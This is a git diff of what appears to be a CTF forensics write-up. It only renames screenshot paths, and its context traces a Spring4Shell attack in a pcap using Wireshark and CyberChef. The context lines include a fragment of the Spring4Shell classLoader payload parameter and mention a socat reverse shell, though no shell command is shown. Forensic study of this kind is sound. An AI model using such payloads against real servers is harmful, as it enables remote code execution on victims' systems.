@@ -29,15 +29,15 @@ We have <mark style="color:yellow;">pcap</mark> file!
 
 Use <mark style="color:red;">Wireshark</mark> open it.
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We have a lot of TCP and HTTP protocol. Let's check it
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Filter <mark style="color:blue;">HTTP</mark>, We can see <mark style="color:orange;">**ip.src = 192.168.1.180**</mark> (Attacker) sent a POST request&#x20;
 
-<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Follow TCP stream we can see the URLencoded:
 
@@ -49,7 +49,7 @@ class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bp
 
 Use CyberChef decode this
 
-<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```java
@@ -59,11 +59,11 @@ class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefi
 
 Check google I know it is a Spring4Shell
 
-<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;In this packet, Hacker is installing <mark style="color:red;">socat</mark> in the victim system and use reverse shell
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```basic
